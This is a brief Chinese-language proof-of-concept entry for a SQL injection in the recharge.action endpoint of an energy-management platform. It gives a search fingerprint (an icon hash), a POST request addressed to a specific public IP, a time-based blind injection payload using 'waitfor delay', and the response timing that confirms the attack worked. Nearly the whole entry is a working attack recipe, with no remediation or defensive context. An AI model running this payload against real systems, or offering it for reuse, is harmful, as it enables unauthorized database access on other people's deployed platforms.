# 玛智慧能源管理平台recharge存在SQL注入漏洞

玛智慧能源管理平台 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-53758288"`
- **请求**：`POST /life/recharge.action HTTP/1.1Host: 153.0.139.173Accept: */*`

**Payload**
```
userId=-1';waitfor delay '0:0:5'--+qs
```
- **响应特征**：200 响应时间>=5s